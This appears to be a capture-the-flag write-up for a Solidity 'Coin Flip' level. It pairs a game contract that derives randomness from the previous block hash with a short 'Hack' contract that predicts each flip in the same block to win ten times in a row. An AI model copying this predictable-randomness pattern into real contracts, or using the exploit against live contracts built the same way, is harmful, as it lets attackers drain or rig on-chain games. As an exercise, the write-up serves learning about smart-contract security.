Coin Flip
Difficulty 3/10

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

  Things that might help

See the Help page above, section "Beyond the console"


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


Solution

Deploy contract: 0x74506fdB003115599B81b2199c8248c87a5904e5

Create this script to guest the flip. Only we have to deploy in the red and call 10 times the function attack. The attact function and victim function
are executed in the same block and have the same answer.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

interface ICoinFlip {
   function flip(bool _guess) external returns (bool);
}

contract Hack {
    address victim = 0x74506fdB003115599B81b2199c8248c87a5904e5;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function atack() public returns (bool) {
        ICoinFlip coinFlipVictim = ICoinFlip(victim);
        uint256 blockValue = uint256(blockhash(block.number -1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return coinFlipVictim.flip(side);
    }
}